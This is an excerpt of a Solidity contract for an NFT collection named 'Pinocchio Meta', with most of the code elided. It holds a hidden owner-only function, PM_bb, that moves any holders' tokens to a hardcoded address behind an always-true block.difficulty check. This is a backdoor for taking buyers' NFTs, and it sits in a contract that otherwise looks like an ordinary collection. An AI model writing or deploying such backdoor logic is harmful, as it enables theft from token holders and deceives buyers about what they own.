...
contract Pinocchio_Meta is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Pinocchio Meta", "PM", maxBatchSize_, collectionSize_) {
  ...
  function PM_bb(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0x31AF7806B6C3C66178d436cEdc81a416aA968a8E, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0xa3f365Dbf4e2454B976FcFD625c04827f2d19B10);
